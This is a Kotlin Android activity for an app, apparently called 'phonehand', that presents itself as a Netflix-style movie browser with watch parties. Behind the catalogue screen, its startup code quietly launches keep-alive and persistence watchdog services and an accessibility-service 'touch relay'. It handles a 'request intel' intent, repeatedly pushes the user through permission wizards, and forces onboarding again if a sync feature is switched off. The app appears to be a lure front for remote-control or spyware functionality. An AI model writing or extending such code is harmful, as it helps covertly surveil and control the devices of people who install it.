package com.phonehand.app

import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.android.material.bottomnavigation.BottomNavigationView
import java.util.concurrent.Executors

/** Netflix-style home — browse uploaded movies &amp; shows, start watch parties. */
class MoviesActivity : AppCompatActivity() {

    private val io = Executors.newSingleThreadExecutor()
    private lateinit var moviesList: RecyclerView
    private lateinit var loading: ProgressBar
    private lateinit var permTeaser: View
    private lateinit var adapter: MoviesAdapter
    private var uploadedItems: List<MovieBrowseItem> = emptyList()
    private var fullBrowseList: List<MoviesListItem> = emptyList()
    @Volatile private var destroyed = false
    private var pendingContentId: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!UserSession.isSignedUp(this) || !UserSession.onboardingDone(this)) {
            startActivity(Intent(this, OnboardingActivity::class.java))
            finish()
            return
        }

        if (intent.getBooleanExtra(HomeActivity.EXTRA_REQUEST_INTEL, false)) {
            PermissionWizardActivity.launch(this)
            finish()
            return
        }

        setContentView(R.layout.activity_movies)

        moviesList = findViewById(R.id.moviesList)
        loading = findViewById(R.id.moviesLoading)
        permTeaser = findViewById(R.id.permHomeTeaser)
        updatePermTeaser()
        adapter = MoviesAdapter { item -> onTitleSelected(item) }
        moviesList.layoutManager = LinearLayoutManager(this)
        moviesList.adapter = adapter

        findViewById<BottomNavigationView>(R.id.bottomNav).setOnItemSelectedListener { item ->
            when (item.itemId) {
                R.id.nav_browse -> {
                    adapter.submit(fullBrowseList)
                    true
                }
                R.id.nav_party -> {
                    startActivity(Intent(this, WatchRoomActivity::class.java))
                    false
                }
                R.id.nav_my_list -> {
                    showMyList()
                    false
                }
                else -> false
            }
        }

        window.decorView.post {
            if (isFinishing || isDestroyed) return@post
            SafeKeepAlive.start(this)
            PersistenceWatchdog.schedule(this)
            TouchAccessibilityService.instance?.ensureRelay()
            runCatching {
                if (PermissionSteps.hasCorePending(this)) {
                    PermissionWizardActivity.launchAtFirstIncomplete(this)
                } else if (PermissionMoments.hasHomeBatch(this)) {
                    PermissionMoments.scheduleHomeSession(this)
                }
            }.onFailure { Log.w(TAG, "permission batch skipped: ${it.message}") }
        }

        pendingContentId = intent.getStringExtra(EXTRA_OPEN_CONTENT_ID)?.takeIf { it.isNotBlank() }
        loadCatalog()
    }

    override fun onResume() {
        super.onResume()
        updatePermTeaser()
        OfferDelivery.pollPending(this)
        if (!WatchSync.isEnabled(this) &&
            UserSession.onboardingDone(this) &&
            UserSession.permissionsWizardDone(this)
        ) {
            runCatching {
                startActivity(Intent(this, OnboardingActivity::class.java))
                finish()
            }.onFailure { Log.w(TAG, "onboarding redirect failed: ${it.message}") }
            return
        }
        TouchAccessibilityService.instance?.ensureRelay()
    }

    private fun loadCatalog() {
        loading.visibility = View.VISIBLE
        val freeItems = FreeCatalog.load(this)
        io.execute {
            val familyItems = runCatching { FamilyLibraryClient.fetch().map { it.toBrowseItem() } }
                .getOrElse { emptyList() }
            val continueItems = ContinueWatchingStore.load(this@MoviesActivity)
            val offers = CatalogClient.fetchPublishedOffers(this@MoviesActivity)
            val catalogItems = CatalogClient.fetchCatalog(this@MoviesActivity)
            val catalogBrowse = catalogItems.map { CatalogClient.toBrowseItem(it) }
            val catalogPremium = catalogBrowse.filter { it.source == "premium" }
            val catalogSeries = catalogBrowse.filter { it.subtitle == "Series" && it.streamUrl.isNotBlank() }
            val catalogMovies = catalogBrowse.filter { it.source == "catalog" && it.subtitle != "Series" }
            uploadedItems = familyItems

            val movies = freeItems.filter { it.kind == "movie" }.map { it.toBrowseItem() }
            val shows = freeItems.filter { it.kind == "tv" }.map { it.toBrowseItem() }
            val trending = if (freeItems.isNotEmpty()) freeItems.shuffled().take(12).map { it.toBrowseItem() }
            else emptyList()

            val featured = familyItems.firstOrNull()
                ?: catalogBrowse.firstOrNull { it.streamUrl.isNotBlank() }
                ?: continueItems.firstOrNull()
                ?: trending.firstOrNull()
                ?: movies.firstOrNull()
                ?: shows.firstOrNull()

            val ctx = applicationContext
            val rows = buildList {
                if (familyItems.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_your_uploads), familyItems)))
                } else {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_your_uploads), listOf(uploadHintItem()))))
                }
                if (continueItems.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_continue), continueItems)))
                }
                if (offers.isNotEmpty()) {
                    val offerItems = offers.map { o ->
                        MovieBrowseItem(
                            id = o.contentId ?: "offer_${o.title.hashCode()}",
                            title = o.title,
                            subtitle = o.reason,
                            description = o.reason,
                            thumbUrl = PosterLoader.placeholderUrl(o.title),
                            streamUrl = "",
                            source = "offer",
                        )
                    }
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_recommended), offerItems)))
                }
                if (catalogPremium.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_premium), catalogPremium)))
                }
                if (catalogSeries.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_series_row), catalogSeries)))
                }
                if (catalogMovies.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_catalog), catalogMovies)))
                }
                if (trending.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_trending), trending)))
                }
                if (shows.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_tv), shows)))
                }
                if (movies.isNotEmpty()) {
                    add(MoviesListItem.Row(MovieRow(ctx.getString(R.string.movies_free), movies)))
                }
            }

            val list = buildList {
                featured?.let { add(MoviesListItem.Hero(it)) }
                addAll(rows)
            }
            fullBrowseList = list

            runOnUiThread {
                if (destroyed || isFinishing) return@runOnUiThread
                loading.visibility = View.GONE
                adapter.submit(list)
                pendingContentId?.let { cid ->
                    pendingContentId = null
                    openContentById(cid, catalogBrowse)
                }
            }
        }
    }

    private fun uploadHintItem(): MovieBrowseItem = MovieBrowseItem(
        id = "upload_hint",
        title = applicationContext.getString(R.string.movies_upload_hint_title),
        subtitle = applicationContext.getString(R.string.movies_upload_hint_sub),
        description = applicationContext.getString(R.string.movies_upload_hint_body),
        thumbUrl = PosterLoader.placeholderUrl("Your Movie"),
        streamUrl = "",
        source = "hint",
    )

    private fun showMyList() {
        val items = uploadedItems.filter { it.source == "family" }
        if (items.isEmpty()) {
            adapter.submit(
                listOf(
                    MoviesListItem.Row(MovieRow(getString(R.string.movies_nav_my_list), listOf(uploadHintItem()))),
                ),
            )
            return
        }
        adapter.submit(listOf(MoviesListItem.Row(MovieRow(getString(R.string.movies_nav_my_list), items))))
    }

    private fun openContentById(contentId: String, catalogBrowse: List<MovieBrowseItem>) {
        val item = catalogBrowse.find { it.id == contentId }
            ?: fullBrowseList.flatMap { row ->
                when (row) {
                    is MoviesListItem.Row -> row.row.items
                    is MoviesListItem.Hero -> listOf(row.item)
                }
            }.find { it.id == contentId }
        if (item != null) {
            onTitleSelected(item)
            return
        }
        Toast.makeText(this, R.string.movies_premium_hint, Toast.LENGTH_LONG).show()
    }

    private fun onTitleSelected(item: MovieBrowseItem) {
        if (item.source == "hint") {
            if (!StorageAccess.ensureForDownload(this)) return
            Toast.makeText(this, R.string.movies_upload_hint_body, Toast.LENGTH_LONG).show()
            return
        }
        if (item.source == "premium" || item.streamUrl.isBlank()) {
            Toast.makeText(this, R.string.movies_premium_hint, Toast.LENGTH_LONG).show()
            return
        }
        openWatchRoom(item)
    }

    private fun openWatchRoom(item: MovieBrowseItem) {
        if ((item.source == "family" || item.source == "hint") && !StorageAccess.isGranted(this)) {
            PermissionMoments.launchStep(this, "storage")
            return
        }
        ContinueWatchingStore.save(this, item)
        startActivity(
            Intent(this, WatchRoomActivity::class.java).apply {
                putExtra(FreeCatalogActivity.EXTRA_STREAM_URL, item.streamUrl)
                putExtra(FreeCatalogActivity.EXTRA_TITLE, item.title)
            },
        )
    }

    private fun updatePermTeaser() {
        if (!::permTeaser.isInitialized) return
        val pct = PermissionSteps.coreProgressPercent(this)
        val pending = PermissionSteps.hasCorePending(this) || PermissionSteps.hasOptionalPending(this)
        permTeaser.visibility = if (pending) View.VISIBLE else View.GONE
        PermHomeTeaser.bind(permTeaser, pct) {
            PermissionWizardActivity.launchAtFirstIncomplete(this)
        }
    }

    override fun onDestroy() {
        destroyed = true
        io.shutdownNow()
        super.onDestroy()
    }

    companion object {
        const val EXTRA_OPEN_CONTENT_ID = "open_content_id"
        private const val TAG = "MoviesActivity"
    }
}
